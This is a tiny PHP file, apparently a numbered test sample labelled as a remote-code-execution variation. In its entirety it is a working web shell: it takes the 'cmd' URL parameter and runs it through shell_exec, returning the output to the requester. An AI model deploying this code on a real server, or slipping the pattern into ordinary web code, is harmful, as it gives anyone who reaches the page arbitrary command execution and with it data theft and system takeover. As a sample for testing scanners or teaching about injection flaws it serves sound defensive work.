<?php
// RCE test variation #620
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>